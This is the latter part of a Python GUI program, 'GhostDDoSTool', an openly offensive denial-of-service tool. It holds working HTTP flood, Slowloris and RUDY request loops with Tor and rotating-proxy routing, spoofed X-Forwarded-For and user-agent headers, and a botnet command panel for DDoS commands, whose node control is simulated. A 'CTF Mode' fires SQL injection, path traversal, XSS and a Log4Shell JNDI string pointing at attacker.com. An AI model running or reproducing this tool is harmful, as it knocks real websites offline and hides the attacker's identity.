        else:
            self.attack_type.set("HTTP Flood")
            self.log("CTF Mode deactivated", "INFO")

    def toggle_js_evasion(self):
        self.log("JavaScript evasion toggled", "INFO")

    def toggle_header_spoofing(self):
        self.log("Header spoofing toggled", "INFO")

    def toggle_ip_obfuscation(self):
        self.log("IP obfuscation toggled", "INFO")

    def toggle_attack(self):
        if not self.attack_active:
            self.start_attack()
        else:
            self.stop_attack()

    def toggle_botnet(self):
        self.botnet_active = not self.botnet_active
        if self.botnet_active:
            self.botnet_btn.config(text="🌀 DEACTIVATE BOTNET")
            self.log("Botnet activated", "BOTNET")
        else:
            self.botnet_btn.config(text="🌀 ACTIVATE BOTNET")
            self.log("Botnet deactivated", "BOTNET")

    def scan_botnet_nodes(self):
        self.log("Scanning for botnet nodes...", "BOTNET")
        threading.Thread(target=self._scan_botnet_nodes_thread, daemon=True).start()

    def _scan_botnet_nodes_thread(self):
        try:
            self.log("Initiating network scan...", "BOTNET")
            time.sleep(2)
            
            simulated_nodes = [
                {"ip": f"192.168.1.{x}", "port": 22, "username": "root", "password": "password"} 
                for x in range(1, random.randint(3, 8))
            ]
            
            with self.botnet_lock:
                for node in simulated_nodes:
                    existing = False
                    for existing_node in self.botnet_nodes:
                        if existing_node['ip'] == node['ip'] and existing_node['port'] == node['port']:
                            existing = True
                            break
                    
                    if not existing:
                        node_id = str(uuid.uuid4())
                        new_node = {
                            "id": node_id,
                            "ip": node["ip"],
                            "port": node["port"],
                            "username": node["username"],
                            "password": node["password"],
                            "type": self.botnet_type_combo.get(),
                            "last_seen": time.time(),
                            "is_active": True
                        }
                        self.botnet_nodes.append(new_node)
                        self.cursor.execute("INSERT INTO botnet_nodes VALUES (?, ?, ?, ?, ?, ?, ?, ?)",
                                          (node_id, node["ip"], node["port"], node["username"], 
                                           node["password"], self.botnet_type_combo.get(), 
                                           time.time(), 1))
                        self.conn.commit()
            
                self.stats_vars["🤖 Botnet Nodes"].set(str(len(self.botnet_nodes)))
            
            self.log(f"Scan completed. Nodes found: {len(simulated_nodes)}", "BOTNET")
        except Exception as e:
            self.log(f"Scan error: {str(e)}", "ERROR")

    def send_botnet_command(self):
        command = self.botnet_cmd_entry.get().strip()
        if not command:
            return
            
        self.log(f"Executing command: {command}", "BOTNET")
        
        if command.lower() == "!scan":
            self.scan_botnet_nodes()
        elif command.lower() == "!list":
            self._list_botnet_nodes()
        elif command.lower() == "!status":
            self._botnet_status()
        elif command.lower().startswith("!connect "):
            self._process_connect_command(command)
        elif command.lower().startswith("!ddos "):
            self._process_ddos_command(command)
        elif command.lower().startswith("!httpflood "):
            self._process_httpflood_command(command)
        elif command.lower() == "!stop":
            self._stop_botnet_attacks()
        elif command.lower() == "!help":
            self._show_botnet_help()
        else:
            self._execute_custom_command(command)

    def _process_connect_command(self, command):
        parts = command.split()
        if len(parts) == 5:
            ip = parts[1]
            port = int(parts[2])
            user = parts[3]
            password = parts[4]
            self._add_botnet_node(ip, port, user, password)
        else:
            self.log("Invalid format. Use: !connect [ip] [port] [user] [pass]", "ERROR")

    def _process_ddos_command(self, command):
        parts = command.split()
        if len(parts) == 3:
            target = parts[1]
            threads = int(parts[2])
            self._launch_botnet_attack(target, threads, "DDoS")
        else:
            self.log("Invalid format. Use: !ddos [target] [threads]", "ERROR")

    def _process_httpflood_command(self, command):
        parts = command.split()
        if len(parts) == 3:
            target = parts[1]
            duration = int(parts[2])
            self._launch_botnet_attack(target, duration, "HTTP Flood")
        else:
            self.log("Invalid format. Use: !httpflood [target] [duration]", "ERROR")

    def _add_botnet_node(self, ip, port, username, password):
        try:
            with self.botnet_lock:
                for node in self.botnet_nodes:
                    if node['ip'] == ip and node['port'] == port:
                        self.log(f"Node {ip}:{port} already exists", "WARNING")
                        return False
            
            self.log(f"Connecting to {ip}:{port}...", "BOTNET")
            time.sleep(1)
            
            if password.lower() == "password":
                self.log(f"Weak credentials at {ip}:{port}", "WARNING")
            
            node_id = str(uuid.uuid4())
            new_node = {
                "id": node_id,
                "ip": ip,
                "port": port,
                "username": username,
                "password": password,
                "type": self.botnet_type_combo.get(),
                "last_seen": time.time(),
                "is_active": True
            }
            
            with self.botnet_lock:
                self.botnet_nodes.append(new_node)
                self.cursor.execute("INSERT INTO botnet_nodes VALUES (?, ?, ?, ?, ?, ?, ?, ?)",
                                  (node_id, ip, port, username, password, 
                                   self.botnet_type_combo.get(), time.time(), 1))
                self.conn.commit()
                self.stats_vars["🤖 Botnet Nodes"].set(str(len(self.botnet_nodes)))
            
            self.log(f"Node added: {ip}:{port} (ID: {node_id})", "BOTNET")
            return True
        except Exception as e:
            self.log(f"Error adding node: {str(e)}", "ERROR")
            return False

    def _list_botnet_nodes(self):
        with self.botnet_lock:
            if not self.botnet_nodes:
                self.log("No nodes in botnet", "BOTNET")
                return
                
            self.log("=== BOTNET NODES ===", "BOTNET")
            for node in self.botnet_nodes:
                status = "🟢 ACTIVE" if node.get("is_active", False) else "🔴 INACTIVE"
                self.log(f"ID: {node['id']} | {node['ip']}:{node['port']} | User: {node['username']} | Status: {status}", "BOTNET")

    def _botnet_status(self):
        with self.botnet_lock:
            total_nodes = len(self.botnet_nodes)
            active_nodes = sum(1 for node in self.botnet_nodes if node.get("is_active", False))
            
        self.log("=== BOTNET STATUS ===", "BOTNET")
        self.log(f"🔹 Total nodes: {total_nodes}", "BOTNET")
        self.log(f"🟢 Active nodes: {active_nodes}", "BOTNET")
        self.log(f"🔧 Type: {self.botnet_type_combo.get()}", "BOTNET")
        self.log(f"⚡ Commands in queue: {self.command_queue.qsize()}", "BOTNET")

    def _launch_botnet_attack(self, target, param, attack_type):
        with self.botnet_lock:
            active_nodes = [node for node in self.botnet_nodes if node.get("is_active", False)]
            
        if not active_nodes:
            self.log("No active nodes to attack", "ERROR")
            return
            
        self.log(f"Starting {attack_type} attack on {target} with parameter {param}", "BOTNET")
        
        for node in active_nodes:
            self.log(f"Sending command to {node['ip']}:{node['port']}...", "BOTNET")
            time.sleep(0.2)
            
            success = random.random() > 0.2
            if success:
                self.log(f"Node {node['ip']}: {attack_type} attack started successfully", "BOTNET")
            else:
                self.log(f"Node {node['ip']}: Error starting attack", "ERROR")

    def _stop_botnet_attacks(self):
        with self.botnet_lock:
            active_nodes = [node for node in self.botnet_nodes if node.get("is_active", False)]
            
        if not active_nodes:
            self.log("No active nodes", "ERROR")
            return
            
        self.log("Stopping all botnet attacks", "BOTNET")
        
        for node in active_nodes:
            self.log(f"Sending STOP command to {node['ip']}:{node['port']}...", "BOTNET")
            time.sleep(0.1)
            self.log(f"Node {node['ip']}: Attacks stopped", "BOTNET")

    def _execute_custom_command(self, command):
        with self.botnet_lock:
            active_nodes = [node for node in self.botnet_nodes if node.get("is_active", False)]
            
        if not active_nodes:
            self.log("No active nodes", "ERROR")
            return
            
        self.log(f"Executing custom command: {command}", "BOTNET")
        
        for node in active_nodes:
            self.log(f"Sending command to {node['ip']}:{node['port']}...", "BOTNET")
            time.sleep(0.2)
            
            success = random.random() > 0.3
            if success:
                self.log(f"Node {node['ip']}: Command executed successfully", "BOTNET")
            else:
                self.log(f"Node {node['ip']}: Error executing command", "ERROR")

    def _show_botnet_help(self):
        self.log("=== BOTNET COMMAND HELP ===", "BOTNET")
        self.log("!scan - Scan for vulnerable devices", "BOTNET")
        self.log("!connect [ip] [port] [user] [pass] - Connect new node", "BOTNET")
        self.log("!list - List connected nodes", "BOTNET")
        self.log("!status - Show botnet status", "BOTNET")
        self.log("!ddos [target] [threads] - Start DDoS attack", "BOTNET")
        self.log("!httpflood [target] [duration] - Start HTTP Flood", "BOTNET")
        self.log("!stop - Stop all attacks", "BOTNET")
        self.log("!help - Show this help", "BOTNET")

    def botnet_monitor(self):
        while True:
            try:
                if not self.botnet_active:
                    time.sleep(1)
                    continue
                    
                while not self.command_queue.empty():
                    command = self.command_queue.get_nowait()
                    self.send_botnet_command(command)
                    
                time.sleep(0.5)
            except Exception as e:
                self.log(f"Botnet monitor error: {str(e)}", "ERROR")
                time.sleep(1)

    def start_attack(self):
        target = self.url_entry.get().strip()
        
        if not target.startswith(("http://", "https://")):
            messagebox.showerror("Error", "URL must start with http:// or https://")
            return
            
        try:
            threads = int(self.threads_entry.get())
            if threads < 1 or threads > self.max_threads:
                raise ValueError
        except:
            messagebox.showerror("Error", f"Threads must be between 1 and {self.max_threads}")
            return
        
        self.attack_active = True
        self.total_requests = 0
        self.successful_requests = 0
        self.start_time = time.time()
        
        self.attack_btn.config(text="⏹️ STOP GHOST STRIKE")
        self.status_var.set("🔴 Ghost Attack Active")
        
        threading.Thread(target=self._run_attack, args=(target, threads), daemon=True).start()

    def stop_attack(self):
        self.attack_active = False
        self.attack_btn.config(text="⏣ INITIATE GHOST STRIKE")
        self.status_var.set("🟢 Ghost Mode: Inactive")
        self.log("Attack stopped by user", "INFO")

    def _run_attack(self, target, threads):
        async def attack_loop():
            try:
                proxy_mode = self.proxy_mode.get()
                attack_type = self.attack_type.get()
                connector = None
                current_proxy = None
                
                if proxy_mode == "Tor Network":
                    if not self.check_tor_status():
                        self.log("Starting Tor for attack...", "TOR")
                        self.start_tor()
                        time.sleep(5)
                    
                    connector = ProxyConnector.from_url(
                        f"socks5://127.0.0.1:{self.tor_socks_port}",
                        rdns=True,
                        verify_ssl=False
                    )
                    self.log("Using Tor network for attack", "TOR")
                
                elif proxy_mode in ["Free Public Proxies", "Custom Proxies", "Hybrid Mode (Recommended)"]:
                    if not self.active_proxies:
                        self.log("No working proxies available", "ERROR")
                        return
                    
                    def get_proxy():
                        return random.choice(self.active_proxies)
                    
                    current_proxy = get_proxy()
                    connector = ProxyConnector.from_url(
                        f"http://{current_proxy}",
                        rdns=True,
                        verify_ssl=False
                    )
                    self.log(f"Using {len(self.active_proxies)} proxies for attack", "INFO")
                
                headers = {
                    'User-Agent': self.ua.random,
                    'Accept': '*/*',
                    'Accept-Language': 'en-US,en;q=0.5',
                    'Referer': 'https://www.google.com/',
                    'X-Forwarded-For': f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"
                }
                
                if self.stealth_mode:
                    headers.update({
                        'Accept-Encoding': 'gzip, deflate, br',
                        'Cache-Control': 'no-cache',
                        'Pragma': 'no-cache'
                    })
                
                if self.ctf_mode:
                    headers.update({
                        'X-CTF-Attack': '1',
                        'X-CTF-Test': 'true'
                    })
                
                timeout = aiohttp.ClientTimeout(total=30)
                
                async with aiohttp.ClientSession(
                    connector=connector,
                    headers=headers,
                    timeout=timeout
                ) as session:
                    tasks = []
                    last_rotation = time.time()
                    rotation_count = 0
                    
                    while self.attack_active:
                        try:
                            if proxy_mode in ["Free Public Proxies", "Hybrid Mode (Recommended)"]:
                                if self.ip_rotation.get() == "Every 10 Requests" and rotation_count >= 10:
                                    if hasattr(connector, '_proxy_url'):
                                        new_proxy = get_proxy()
                                        connector._proxy_url = f"http://{new_proxy}"
                                        current_proxy = new_proxy
                                        last_rotation = time.time()
                                        rotation_count = 0
                                        self.log(f"Rotated to new proxy: {new_proxy}", "PROXY")
                                elif self.ip_rotation.get() == "Every 50 Requests" and rotation_count >= 50:
                                    if hasattr(connector, '_proxy_url'):
                                        new_proxy = get_proxy()
                                        connector._proxy_url = f"http://{new_proxy}"
                                        current_proxy = new_proxy
                                        last_rotation = time.time()
                                        rotation_count = 0
                                        self.log(f"Rotated to new proxy: {new_proxy}", "PROXY")
                                elif self.ip_rotation.get() == "Random Rotation" and random.random() > 0.8:
                                    if hasattr(connector, '_proxy_url'):
                                        new_proxy = get_proxy()
                                        connector._proxy_url = f"http://{new_proxy}"
                                        current_proxy = new_proxy
                                        last_rotation = time.time()
                                        self.log(f"Randomly rotated to new proxy: {new_proxy}", "PROXY")
                            
                            task = asyncio.create_task(
                                self._send_attack_request(target, session, attack_type, current_proxy))
                            tasks.append(task)
                            rotation_count += 1
                            
                            if len(tasks) >= threads:
                                done, pending = await asyncio.wait(
                                    tasks, 
                                    return_when=asyncio.FIRST_COMPLETED)
                                
                                for task in done:
                                    try:
                                        status = task.result()
                                        if status and 200 <= status < 300:
                                            self.successful_requests += 1
                                    except:
                                        pass
                                    
                                    self.total_requests += 1
                                    self.update_stats()
                                
                                tasks = list(pending)
                            
                            if self.stealth_mode:
                                await asyncio.sleep(random.uniform(0.1, 0.5))
                            else:
                                await asyncio.sleep(0.01)
                            
                        except Exception as e:
                            self.log(f"Attack error: {str(e)}", "ERROR")
                            await asyncio.sleep(1)
                
            except Exception as e:
                self.log(f"Attack failed: {str(e)}", "ERROR")
            finally:
                self.attack_active = False
                self.root.after(0, lambda: self.attack_btn.config(text="⏣ INITIATE GHOST STRIKE"))
                self.status_var.set("🟢 Ghost Mode: Inactive")
                self.update_stats()
        
        asyncio.run(attack_loop())

    async def _send_attack_request(self, target, session, attack_type, proxy_ip=None):
        try:
            attack_msg = f"Attacking {target} via proxy: {proxy_ip if proxy_ip else 'DIRECT'}"
            self.log(attack_msg, "ATTACK")
            
            if attack_type == "Slowloris":
                headers = {
                    "User-Agent": self.ua.random,
                    "Content-Length": "42",
                    "Connection": "keep-alive"
                }
                async with session.get(target, headers=headers) as response:
                    await asyncio.sleep(random.uniform(30, 60))
                    return response.status
            
            elif attack_type == "RUDY":
                data = "x=" + ("a" * random.randint(5000, 10000))
                headers = {
                    "User-Agent": self.ua.random,
                    "Content-Type": "application/x-www-form-urlencoded",
                    "Content-Length": str(len(data)),
                    "Connection": "keep-alive"
                }
                async with session.post(target, headers=headers, data=data) as response:
                    await asyncio.sleep(random.uniform(30, 60))
                    return response.status
            
            elif attack_type == "CTF Mode":
                method = random.choice(["GET", "POST"])
                
                if method == "GET":
                    params = {
                        "id": random.choice([
                            "1",
                            "1' OR 1=1--",
                            "../../etc/passwd",
                            "<script>alert(1)</script>"
                        ]),
                        "search": random.choice([
                            "flag",
                            "password",
                            "admin",
                            "${jndi:ldap://attacker.com/exploit}"
                        ])
                    }
                    async with session.get(target, params=params) as response:
                        return response.status
                else:
                    data = {
                        "username": random.choice([
                            "admin",
                            "admin'--",
                            "admin' OR '1'='1"
                        ]),
                        "password": random.choice([
                            "password",
                            "' OR 1=1--",
                            "admin123"
                        ])
                    }
                    async with session.post(target, data=data) as response:
                        return response.status
            
            else:
                if random.random() > 0.8:
                    data = {
                        f'param{random.randint(1,10)}': ''.join(random.choices('abcdefghijklmnopqrstuvwxyz', k=10))
                    }
                    async with session.post(target, data=data) as response:
                        return response.status
                else:
                    async with session.get(target) as response:
                        return response.status
        
        except Exception as e:
            return None

    def update_stats(self):
        if self.start_time:
            duration = time.time() - self.start_time
            h = int(duration // 3600)
            m = int((duration % 3600) // 60)
            s = int(duration % 60)
            duration_str = f"{h:02d}:{m:02d}:{s:02d}"
            
            req_rate = self.total_requests / duration if duration > 0 else 0
            success_rate = (self.successful_requests / self.total_requests * 100) if self.total_requests > 0 else 0
            
            self.stats_vars["⏱️ Total Requests"].set(str(self.total_requests))
            self.stats_vars["✅ Success Rate"].set(f"{success_rate:.1f}%")
            self.stats_vars["⌛ Duration"].set(duration_str)
            self.stats_vars["⚡ Req/Sec"].set(f"{req_rate:.1f}")
            
            if self.proxy_mode.get() == "Tor Network" and random.random() > 0.95:
                self.new_tor_identity()

    def log(self, message, level="INFO"):
        if not hasattr(self, 'log_text') or self.log_text is None:
            return
            
        timestamp = datetime.now().strftime("%H:%M:%S")
        self.log_text.insert(tk.END, f"[{timestamp}] {message}\n", level)
        self.log_text.see(tk.END)
        self.root.update()

    def encrypt_data(self, data):
        if isinstance(data, str):
            data = data.encode('utf-8')
        return self.cipher.encrypt(data)
    
    def decrypt_data(self, encrypted_data):
        return self.cipher.decrypt(encrypted_data)

    def on_close(self):
        if self.attack_active:
            if messagebox.askyesno("Warning", 
                                 "Attack is still active. Are you sure you want to quit?"):
                self.attack_active = False
                self.root.destroy()
        else:
            self.root.destroy()

if __name__ == "__main__":
    root = tk.Tk()
    app = GhostDDoSTool(root)
    root.protocol("WM_DELETE_WINDOW", app.on_close)
    root.mainloop()
